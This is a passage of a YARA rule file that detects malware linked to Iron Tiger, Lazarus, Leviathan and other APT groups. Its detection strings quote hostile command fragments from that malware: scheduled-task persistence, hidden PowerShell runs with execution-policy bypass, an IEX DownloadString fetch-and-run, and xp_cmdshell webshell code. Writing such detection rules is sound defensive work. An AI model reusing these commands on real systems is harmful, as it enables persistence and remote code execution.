\"CreaetProcess Error\" nocase wide ascii\n        $bla1 = \"Sucess!\" nocase wide ascii\n        $bla2 = \"user canceled!\" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and ((any of ($str*)) or (all of ($bla*)))\n}\n\nrule IronTiger_wmiexec\n{\n    meta:\n        description = \"Iron Tiger Tool - wmi.vbs detection\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_wmiexec\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"Temp Result File , Change it to where you like\" nocase wide ascii\n        $str2 = \"wmiexec\" nocase wide ascii\n        $str3 = \"By. Twi1ight\" nocase wide ascii\n        $str4 = \"[both mode] ,delay TIME to read result\" nocase wide ascii\n        $str5 = \"such as nc.exe or Trojan\" nocase wide ascii\n        $str6 = \"+++shell mode+++\" nocase wide ascii\n        $str7 = \"win2008 fso has no privilege to delete file\" nocase wide ascii\n\n    condition:\n        2 of ($str*)\n}\n\nrule IronTiger_IronPanda_DNSTunClient\n{\n    meta:\n        description = \"Iron Panda malware DnsTunClient (file: named.exe)\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"https://goo.gl/E4qia9\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronPanda_DNSTunClient\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"dnstunclient -d or -domain <domain>\" fullword ascii\n        $s2 = \"dnstunclient -ip <server ip address>\" fullword ascii\n        $s3 = \"C:\\\\Windows\\\\System32\\\\cmd.exe /C schtasks /create /tn \\\"\\\\Microsoft\\\\Windows\\\\PLA\\\\System\\\\Microsoft Windows\\\" /tr \" fullword ascii\n        $s4 = \"C:\\\\Windows\\\\System32\\\\cmd.exe /C schtasks /create /tn \\\"Microsoft Windows\\\" /tr \" fullword ascii\n        $s5 = \"taskkill /im conime.exe\" fullword ascii\n        $s6 = \"\\\\dns control\\\\t-DNSTunnel\\\\DnsTunClient\\\\DnsTunClient.cpp\" fullword ascii\n        $s7 = \"UDP error:can not bing the port(if there is unclosed the bind process?)\" fullword ascii\n        $s8 = \"use error domain,set domain pls use -d or -domain mark(Current: %s,recv %s)\" fullword ascii\n        $s9 = \"error: packet num error.the connection have condurt,pls try later\" fullword ascii\n        $s10 = \"Coversation produce one error:%s,coversation fail\" fullword ascii\n        $s11 = \"try to add many same pipe to select group(or mark is too easy).\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and 2 of them) or 5 of them\n}\n\nrule IronTiger_IronPanda_Malware1\n{\n    meta:\n        description = \"Iron Panda Malware\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"https://goo.gl/E4qia9\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronPanda_Malware1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"activedsimp.dll\" fullword wide\n        $s1 = \"get_BadLoginAddress\" fullword ascii\n        $s2 = \"get_LastFailedLogin\" fullword ascii\n        $s3 = \"ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED\" fullword ascii\n        $s4 = \"get_PasswordExpirationDate\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule IronTiger_IronPanda_Webshell_JSP\n{\n    meta:\n        description = \"Iron Panda Malware JSP\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"https://goo.gl/E4qia9\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronPanda_Webshell_JSP\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Bin_ExecSql(\\\"exec master..xp_cmdshell'bcp \\\\\\\"select safile from \\\" + db + \\\"..bin_temp\\\\\\\" queryout \\\\\\\"\\\" + Bin_TextBox_SaveP\" ascii\n        $s2 = \"tc.Text=\\\"<a href=\\\\\\\"javascript:Bin_PostBack('zcg_ClosePM','\\\"+Bin_ToBase64(de.Key.ToString())+\\\"')\\\\\\\">Close</a>\\\";\" fullword ascii\n        $s3 = \"Bin_ExecSql(\\\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\\\");\" fullword ascii\n\n    condition:\n        filesize < 330KB and 1 of them\n}\n\nrule IronTiger_IronPanda_Malware_Htran\n{\n    meta:\n        description = \"Iron Panda Malware Htran\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"https://goo.gl/E4qia9\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronPanda_Malware_Htran\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"[-] Gethostbyname(%s) error:%s\" fullword ascii\n        $s2 = \"%s -<listen|tran|slave> <option> [-log logfile]\" fullword ascii\n        $s3 = \"-slave <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n        $s4 = \"[-] ERROR: Must supply logfile name.\" fullword ascii\n        $s5 = \"[SERVER]connection to %s:%d error\" fullword ascii\n        $s6 = \"[+] Make a Connection to %s:%d....\" fullword ascii\n        $s7 = \"[+] Waiting another Client on port:%d....\" fullword ascii\n        $s8 = \"[+] Accept a Client on port %d from %s\" fullword ascii\n        $s9 = \"[+] Make a Connection to %s:%d ......\" fullword ascii\n        $s10 = \"cmshared_get_ptr_from_atom\" fullword ascii\n        $s11 = \"_cmshared_get_ptr_from_atom\" fullword ascii\n        $s12 = \"[+] OK! I Closed The Two Socket.\" fullword ascii\n        $s13 = \"[-] TransmitPort invalid.\" fullword ascii\n        $s14 = \"[+] Waiting for Client on port:%d ......\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 125KB and 3 of them) or 5 of them\n}\n\nrule IronTiger_IronPanda_Malware2\n{\n    meta:\n        description = \"Iron Panda Malware\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"https://goo.gl/E4qia9\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronPanda_Malware2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"\\\\setup.exe\" fullword ascii\n        $s1 = \"msi.dll.urlUT\" fullword ascii\n        $s2 = \"msi.dllUT\" fullword ascii\n        $s3 = \"setup.exeUT\" fullword ascii\n        $s4 = \"/c del /q %s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 180KB and all of them\n}\n\nrule IronTiger_IronPanda_Malware3\n{\n    meta:\n        description = \"Iron Panda Malware\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"https://goo.gl/E4qia9\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronPanda_Malware3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"PluginDeflater.exe\" fullword wide\n        $s1 = \".Deflated\" fullword wide\n        $s2 = \"PluginDeflater\" fullword ascii\n        $s3 = \"DeflateStream\" fullword ascii\n        $s4 = \"CompressionMode\" fullword ascii\n        $s5 = \"System.IO.Compression\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 10KB and all of them\n}\n\nrule IronTiger_IronPanda_Malware4\n{\n    meta:\n        description = \"Iron Panda Malware\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"https://goo.gl/E4qia9\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronPanda_Malware4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"TestPlugin.dll\" fullword wide\n        $s1 = \"<a href='http://www.baidu.com'>aasd</a>\" fullword wide\n        $s2 = \"Zcg.Test.AspxSpyPlugins\" fullword ascii\n        $s6 = \"TestPlugin\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 10KB and all of them\n}\n\nrule IronGate_APT_Step7ProSim_Gen\n{\n    meta:\n        description = \"IronGate APT Malware\"\n        threat_names = \"IronGate\"\n        ref = \"https://goo.gl/Mr6M2J\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"IronGate_APT_Step7ProSim_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\obj\\\\Release\\\\Step7ProSim.pdb\" ascii\n        $s1 = \"Step7ProSim.Interfaces\" fullword ascii\n        $s2 = \"payloadExecutionTimeInMilliSeconds\" fullword ascii\n        $s3 = \"PackagingModule.Step7ProSim.dll\" fullword wide\n        $s4 = \"<KillProcess>b__0\" fullword ascii\n        $s5 = \"newDllFilename\" fullword ascii\n        $s6 = \"PackagingModule.exe\" fullword wide\n        $s7 = \"$863d8af0-cee6-4676-96ad-13e8540f4d47\" fullword ascii\n        $s8 = \"RunPlcSim\" fullword ascii\n        $s9 = \"$ccc64bc5-ef95-4217-adc4-5bf0d448c272\" fullword ascii\n        $s10 = \"InstallProxy\" fullword ascii\n        $s11 = \"DllProxyInstaller\" fullword ascii\n        $s12 = \"FindFileInDrive\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 50KB and ($x1 or 3 of ($s*))) or (6 of them)\n}\n\nrule IronGate_PyInstaller_update_EXE\n{\n    meta:\n        description = \"PyInstaller file named update.exe as mentioned in the IronGate APT\"\n        threat_names = \"IronGate\"\n        ref = \"https://goo.gl/Mr6M2J\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"IronGate_PyInstaller_update_EXE\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"bpython27.dll\" fullword ascii\n        $s5 = \"%s%s.exe\" fullword ascii\n        $s6 = \"bupdate.exe.manifest\" fullword ascii\n        $s9 = \"bunicodedata.pyd\" fullword ascii\n        $s11 = \"distutils.sysconfig(\" fullword ascii\n        $s16 = \"distutils.debug(\" fullword ascii\n        $s18 = \"supdate\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and all of them\n}\n\nrule IronGate_Nirsoft_NetResView\n{\n    meta:\n        description = \"NirSoft NetResView - utility that displays the list of all network resources\"\n        threat_names = \"NetResView\"\n        ref = \"https://goo.gl/Mr6M2J\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Nirsoft_NetResView\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"NetResView.exe\" fullword wide\n        $s2 = \"2005 - 2013 Nir Sofer\" wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule Lazarus_rsakey\n{\n    meta:\n        description = \"Lazarus / HIDDEN COBRA RSA key\"\n        threat_names = \"Lazarus\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US-CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_hiddencobra_rsakey\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $rsaKey = { 7B 4E 1E A7 E9 3F 36 4C DE F4 F0 99 C4 D9 B7 94\n                    A1 FF F2 97 D3 91 13 9D C0 12 02 E4 4C BB 6C 77\n                    48 EE 6F 4B 9B 53 60 98 45 A5 28 65 8A 0B F8 39\n                    73 D7 1A 44 13 B3 6A BB 61 44 AF 31 47 E7 87 C2\n                    AE 7A A7 2C 3A D9 5C 2E 42 1A A6 78 FE 2C AD ED\n                    39 3F FA D0 AD 3D D9 C5 3D 28 EF 3D 67 B1 E0 68\n                    3F 58 A0 19 27 CC 27 C9 E8 D8 1E 7E EE 91 DD 13\n                    B3 47 EF 57 1A CA FF 9A 60 E0 64 08 AA E2 92 D0 }\n\n    condition:\n        any of them\n}\n\nrule Lazarus_binaries\n{\n    meta:\n        description = \"Lazarus / HIDDEN COBRA binary\"\n        threat_names = \"Lazarus\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US-CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_hiddencobra_binaries\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = \"Wating\" wide ascii\n        $STR2 = \"Reamin\" wide ascii\n        $STR3 = \"laptos\" wide ascii\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 2 of them\n}\n\nrule Lazarus_urlbuilder\n{\n    meta:\n        description = \"Lazarus / HIDDEN COBRA URL builder\"\n        threat_names = \"Lazarus\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US-CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_hiddencobra_urlbuilder\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $randomUrlBuilder = { 83 EC 48 53 55 56 57 8B 3D ?? ?? ?? ?? 33 C0 C7 44 24 28 B4 6F 41 00 C7 44 24 2C B0 6F 41 00 C7 44 24 30 AC 6F 41 00 C7 44 24 34 A8 6F 41 00 C7 44 24 38 A4 6F 41 00 C7 44 24 3C A0 6F 41 00 C7 44 24 40 9C 6F 41 00 C7 44 24 44 94 6F 41 00 C7 44 24 48 8C 6F 41 00 C7 44 24 4C 88 6F 41 00 C7 44 24 50 80 6F 41 00 89 44 24 54 C7 44 24 10 7C 6F 41 00 C7 44 24 14 78 6F 41 00 C7 44 24 18 74 6F 41 00 C7 44 24 1C 70 6F 41 00 C7 44 24 20 6C 6F 41 00 89 44 24 24 FF D7 99 B9 0B 00 00 00 F7 F9 8B 74 94 28 BA 9C 6F 41 00 66 8B 06 66 3B 02 74 34 8B FE 83 C9 FF 33 C0 8B 54 24 60 F2 AE 8B 6C 24 5C A1 ?? ?? ?? ?? F7 D1 49 89 45 00 8B FE 33 C0 8D 5C 11 05 83 C9 FF 03 DD F2 AE F7 D1 49 8B FE 8B D1 EB 78 FF D7 99 B9 05 00 00 00 8B 6C 24 5C F7 F9 83 C9 FF 33 C0 8B 74 94 10 8B 54 24 60 8B FE F2 AE F7 D1 49 BF 60 6F 41 00 8B D9 83 C9 FF F2 AE F7 D1 8B C2 49 03 C3 8B FE 8D 5C 01 05 8B 0D ?? ?? ?? ?? 89 4D 00 83 C9 FF 33 C0 03 DD F2 AE F7 D1 49 8D 7C 2A 05 8B D1 C1 E9 02 F3 A5 8B CA 83 E1 03 F3 A4 BF 60 6F 41 00 83 C9 FF F2 AE F7 D1 49 BE 60 6F 41 00 8B D1 8B FE 83 C9 FF 33 C0 F2 AE F7 D1 49 8B FB 2B F9 8B CA 8B C1 C1 E9 02 F3 A5 8B C8 83 E1 03 F3 A4 8B 7C 24 60 8D 75 04 57 56 E8 ?? ?? ?? ?? 83 C4 08 C6 04 3E 2E 8B C5 C6 03 00 5F 5E 5D 5B 83 C4 48 C3 }\n\n    condition:\n        $randomUrlBuilder\n}\n\nrule Lazarus_BANKSHOT_Gen\n{\n    meta:\n        description = \"Hidden Cobra BANKSHOT trojan\"\n        threat_names = \"Lazarus\"\n        ref = \"https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"HiddenCobra_BANKSHOT_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Win32)\" fullword wide\n        $s2 = \"rHTTP/1.1 200 Connection established\" fullword wide\n        $s3 = \"Proxy-Connection: keep-alive\" fullword wide\n        $s4 = \"\\\\msncf.dat\" fullword wide\n        $s5 = \"msvcru32.bat\" fullword ascii\n        $s6 = \"reg delete \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" /v \\\"%s\\\" /f\" fullword ascii\n        $s7 = \"MXINFO.DLL\" fullword ascii\n        $s8 = \"usrvc32.bat\" fullword ascii\n        $s9 = \"ping -n 1 127.0.0.1\" fullword ascii\n        $s10 = \"%sd.e%sc \\\"%s > %s 2>&1\\\"\" ascii fullword\n        $s11 = \"DWS*.tmp\" ascii fullword\n        $s12 = \"CS*.tmp\" fullword wide\n        $s13 = \"WM*.tmp\" fullword wide\n        $x1 = \"CgpaipIddwspwe32Hnaehsdi\" fullword ascii\n        $x2 = \"RpiPmtiCdopIsgpao\" fullword ascii\n        $x3 = \"RpiLtnodlhOtgpcidgyA\" fullword ascii\n        $x4 = \"LatiQdgHtnrwpDbupci\" fullword ascii\n        $x5 = \"vchost.exe\" fullword ascii\n        $x6 = \"\\\\system32\\\\msncf.dat\" fullword ascii\n        $x7 = \"GprthipgHpgktcpCigwSanowpgA\" fullword ascii\n        $a1 = \"live.dropbox.com\" fullword ascii\n        $a2 = \"tatadocomo.yahoo.com\" fullword ascii\n        $a3 = \"widgets.twimg.com\" fullword ascii\n        $a4 = \"history.paypal.com\" fullword ascii\n        $a5 = \"www.bitcoin.org\" fullword ascii\n        $a6 = \"web.whatsapp.com\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and (1 of ($x*) or 2 of ($s*) or 4 of ($a*))\n}\n\nrule Lazarus_Dec_17_1\n{\n    meta:\n        description = \"Lazarus malware from incident in Dec 2017\"\n        threat_names = \"Lazarus\"\n        ref = \"https://goo.gl/8U6fY2\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Lazarus_Dec_17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"::DataSpace/Storage/MSCompressed/Transform/\" ascii\n        $s2 = \"HHA Version 4.\" ascii\n        $s3 = { 74 45 58 74 53 6F 66 74 77 61 72 65 00 41 64 6F\n              62 65 20 49 6D 61 67 65 52 65 61 64 79 71 }\n        $s4 = \"bUEeYE\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5449 and filesize < 4000KB and all of them\n}\n\nrule Lazarus_Dec_17_2\n{\n    meta:\n        description = \"Lazarus malware from incident in Dec 2017\"\n        threat_names = \"Lazarus\"\n        ref = \"https://goo.gl/8U6fY2\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Lazarus_Dec_17_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"SkypeSetup.exe\" fullword wide\n        $s2 = \"%s\\\\SkypeSetup.exe\" fullword ascii\n        $s3 = \"Skype Technologies S.A.\" fullword wide\n        $a1 = \"Microsoft Code Signing PCA\" ascii wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 7000KB and (all of ($s*) and not $a1)\n}\n\nrule Lazarus_Dec_17_4\n{\n    meta:\n        description = \"Lazarus malware from incident in Dec 2017ithumb.js\"\n        threat_names = \"Lazarus\"\n        ref = \"https://goo.gl/8U6fY2\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Lazarus_Dec_17_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"var _0xf5ed=[\\\"\\\\x57\\\\x53\\\\x63\\\\x72\\\\x69\\\\x70\\\\x74\\\\x2E\\\\x53\\\\x68\\\\x65\\\\x6C\\\\x6C\\\",\" ascii\n\n    condition:\n        filesize < 9KB and 1 of them\n}\n\nrule Lazarus_Dec_17_5\n{\n    meta:\n        description = \"Lazarus malware from incident in Dec 2017\"\n        threat_names = \"Lazarus\"\n        ref = \"https://goo.gl/8U6fY2\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Lazarus_Dec_17_5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"$ProID = Start-Process powershell.exe -PassThru -WindowStyle Hidden -ArgumentList\" fullword ascii\n        $x2 = \"$respTxt = HttpRequestFunc_doprocess -szURI $szFullURL -szMethod $szMethod -contentData $contentData;\" fullword ascii\n        $x3 = \"[String]$PS_PATH = \\\"C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\Documents\\\\\\\\ProxyAutoUpdate.ps1\\\";\" fullword ascii\n        $x4 = \"$cmdSchedule = 'schtasks /create /tn \\\"ProxyServerUpdater\\\"\" ascii\n        $x5 = \"/tr \\\"powershell.exe -ep bypass -windowstyle hidden -file \" ascii\n        $x6 = \"C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\Documents\\\\\\\\tmp' + -join \" ascii\n        $x7 = \"$cmdResult = cmd.exe /c $cmdInst | Out-String;\" fullword ascii\n        $x8 = \"whoami /groups | findstr /c:\\\"S-1-5-32-544\\\"\" fullword ascii\n\n    condition:\n        filesize < 500KB and 1 of them\n}\n\nrule Leviathan_SeDLL_Javascript_Decryptor\n{\n    meta:\n        description = \"SeDll - DLL is used for decrypting and executing another JavaScript backdoor such as Orz\"\n        threat_names = \"Leviathan\"\n        ref = \"https://goo.gl/MZ7dRg\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SeDLL_Javascript_Decryptor\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"SEDll_Win32.dll\" fullword ascii\n        $x2 = \"regsvr32 /s \\\"%s\\\" DR __CIM__\" fullword wide\n        $s1 = \"WScriptW\" fullword ascii\n        $s2 = \"IWScript\" fullword ascii\n        $s3 = \"%s\\\\%s~%d\" fullword wide\n        $s4 = \"PutBlockToFileWW\" fullword ascii\n        $s5 = \"CheckUpAndDownWW\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 40KB and (1 of ($x*) or 4 of them)\n}\n\nrule Leviathan_CobaltStrike_Sample_1\n{\n    meta:\n        description = \"Cobalt Strike sample from Leviathan report\"\n        threat_names = \"Leviathan\"\n        ref = \"https://goo.gl/MZ7dRg\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Leviathan_CobaltStrike_Sample_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"a54c81.dll\" fullword ascii\n        $x2 = \"%d is an x64 process (can't inject x86 content)\" fullword ascii\n        $x3 = \"Failed to impersonate logged on user %d (%u)\" fullword ascii\n        $s1 = \"powershell -nop -exec bypass -EncodedCommand \\\"%s\\\"\" fullword ascii\n        $s2 = \"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s\" fullword ascii\n        $s3 = \"could not run command (w/ token) because of its length of %d bytes!\" fullword ascii\n        $s4 = \"could not write to process memory: %d\" fullword ascii\n        $s5 = \"%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s\" fullword ascii\n        $s6 = \"Could not connect to pipe (%s): %d\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 600KB and (1 of ($x*) or 3 of them)\n}\n\nrule Leviathan_MockDll_Gen\n{\n    meta:\n        description = \"MockDll - regsvr DLL loader\"\n        threat_names = \"Leviathan\"\n        ref = \"https://goo.gl/MZ7dRg\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MockDll_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"mock_run_ini_Win32.dll\" fullword ascii\n        $x2 = \"mock_run_ini_x64.dll\" fullword ascii\n        $s1 = \"RealCmd=%s %s\" fullword ascii\n        $s2 = \"MockModule=%s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 20KB and (1 of ($x*) or 2 of them)\n}\n\nrule Leviathan_VBScript_Favicon_File\n{\n    meta:\n        description = \"VBScript cloaked as Favicon file used in Leviathan incident\"\n        threat_names = \"Leviathan\"\n        ref = \"https://goo.gl/MZ7dRg\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"VBScript_Favicon_File\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"myxml = '<?xml version=\\\"\\\"1.0\\\"\\\" encoding=\\\"\\\"UTF-8\\\"\\\"?>';myxml = myxml +'<root>\" ascii\n        $x2 = \".Run \\\"taskkill /im mshta.exe\" ascii\n        $x3 = \"<script language=\\\"VBScript\\\">Window.ReSizeTo 0, 0 : Window.moveTo -2000,-2000 :\" ascii\n        $s1 = \".ExpandEnvironmentStrings(\\\"%ALLUSERSPROFILE%\\\") &\" fullword ascii\n        $s2 = \".ExpandEnvironmentStrings(\\\"%temp%\\\") & \" ascii\n\n    condition:\n        filesize < 100KB and (uint16(0) == 0x733c and 1 of ($x*)) or (3 of them)\n}\n\nrule Microcin_Sample_1\n{\n    meta:\n        description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n        threat_names = \"Microcin\"\n        ref = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Microcin_Sample_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 